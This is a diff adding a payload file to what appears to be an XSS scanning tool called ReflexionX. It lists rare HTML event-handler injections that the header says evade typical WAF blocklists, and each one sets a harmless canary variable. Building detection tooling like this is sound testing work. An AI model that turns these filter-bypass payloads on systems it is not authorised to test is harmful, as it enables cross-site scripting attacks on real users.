@@ -1,0 +1,36 @@
+# ReflexionX v1.0.0 — Rare Event Handler Payloads
+# Event handlers not in typical WAF blocklists
+# Each payload sets window._xss_confirmed = 'CANARY'
+
+<div tabindex=1 onauxclick=window._xss_confirmed='CANARY'>click</div>
+<details open onbeforetoggle=window._xss_confirmed='CANARY'>
+<div onscrollend=window._xss_confirmed='CANARY' style="overflow:auto;height:10px"><br><br><br></div>
+<div onpointerrawupdate=window._xss_confirmed='CANARY'>touch</div>
+<input onbeforeinput=window._xss_confirmed='CANARY' autofocus>
+<form onformdata=window._xss_confirmed='CANARY'><button>submit</button></form>
+<div onsecuritypolicyviolation=window._xss_confirmed='CANARY'>
+<slot onslotchange=window._xss_confirmed='CANARY'>
+<div style="animation:x" ontransitionrun=window._xss_confirmed='CANARY'>
+<div style="transition:all" ontransitionstart=window._xss_confirmed='CANARY'>
+<div ontransitionend=window._xss_confirmed='CANARY' style="transition:opacity 0.01s">
+<div ontransitioncancel=window._xss_confirmed='CANARY'>
+<div style="animation:x 1s" onanimationiteration=window._xss_confirmed='CANARY'>
+<canvas oncontextlost=window._xss_confirmed='CANARY'>
+<canvas oncontextrestored=window._xss_confirmed='CANARY'>
+<div onpointerleave=window._xss_confirmed='CANARY'>hover then leave</div>
+<div onpointerover=window._xss_confirmed='CANARY'>hover</div>
+<div onlostpointercapture=window._xss_confirmed='CANARY'>
+<div ongotpointercapture=window._xss_confirmed='CANARY'>
+<div onwheel=window._xss_confirmed='CANARY'>scroll wheel</div>
+<div ondragstart=window._xss_confirmed='CANARY' draggable=true>drag</div>
+<div ondragend=window._xss_confirmed='CANARY' draggable=true>drag end</div>
+<div ondragover=window._xss_confirmed='CANARY'>
+<div ondrop=window._xss_confirmed='CANARY'>
+<input onsearch=window._xss_confirmed='CANARY' type=search autofocus>
+<body onpageshow=window._xss_confirmed='CANARY'>
+<body onpagehide=window._xss_confirmed='CANARY'>
+<body onbeforeprint=window._xss_confirmed='CANARY'>
+<body onafterprint=window._xss_confirmed='CANARY'>
+<body onhashchange=window._xss_confirmed='CANARY'>
+<body onpopstate=window._xss_confirmed='CANARY'>
+<body onmessage=window._xss_confirmed='CANARY'>
